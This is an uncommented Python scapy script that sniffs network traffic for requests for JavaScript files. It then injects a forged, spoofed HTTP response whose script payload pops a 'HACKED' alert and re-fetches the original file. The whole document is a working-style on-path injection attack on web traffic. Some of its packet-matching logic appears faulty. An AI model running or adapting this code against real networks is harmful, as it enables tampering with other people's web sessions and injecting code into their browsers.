import sys

from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTP
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from datetime import datetime


def request_detecting():
    sniff(iface='eth0', prn=add_http)


def add_http(pack):
    if pack.haslayer(HTTPRequest) and str(pack[HTTPRequest]).find(".js") > -1:
        print("HTTP req id: ", pack[IP].id)
        sniff(iface='eth0', prn=lambda p: send_resp(p, pack))


def send_resp(pack, pattern):
    print(pack[IP].id)
    if pack.haslayer(TCP) and pack[TCP].seq == pattern[TCP].ack:
        script_src = "http://" + str(pack[HTTPRequest].Host).split("'")[1] + str(pack[HTTPRequest]).split(' ')[1]
        now = datetime.now()
        payload = "alert(\"HACKED\");" \
                  "fetch('{URL}', {cache})".format(URL=script_src, cache="cache: \"no-store\"")
        RESP = "HTTP/1.1 200 OK\r\n"
        RESP += "Server: nginx/1.1.19\r\n"
        RESP += "Date: Sat, 11 Jun 2022 {h}:{m}:{s} GMT\r\n".format(h=now.hour, m=now.minute, s=now.second)
        RESP += "Content_Type: application/x-javascript\r\n"
        RESP += "Content-Length: {l}\r\n".format(l=len(payload))
        RESP += "Last-Modified: Mon, 23 May 2016 09:00:29 GMT\r\n"
        RESP += "Connection: keep-alive\r\n"
        RESP += "Expires: Thu, 31 Dec 2037 23:55:55 GMT\r\n"
        RESP += "Vary: Accept-Encoding\r\n"
        RESP += "Cache-Control: max-age=315360000\r\n"
        RESP += "Accept-Ranges: bytes\r\n"
        RESP += "\r\n"
        RESP += payload

        fake_packet = Ether(src=pack[Ether].src, dst=pack[Ether].dst) / \
                      IP(src=pack[IP].src, dst=pack[IP].dst, id=pack[IP].id + 1, flags=2, ttl=pack[IP].ttl) / \
                      TCP(sport=pack[TCP].sport, dport=pack[TCP].dport, seq=pack[TCP].seq, window=pack[TCP].window,
                          ack=pack[TCP].ack, flags=0x018, options=pack[TCP].options) / \
                      RESP
        sendp(fake_packet)
        fake_packet.show()
        sys.exit()


def main():
    request_detecting()


if __name__ == "__main__":
    main()
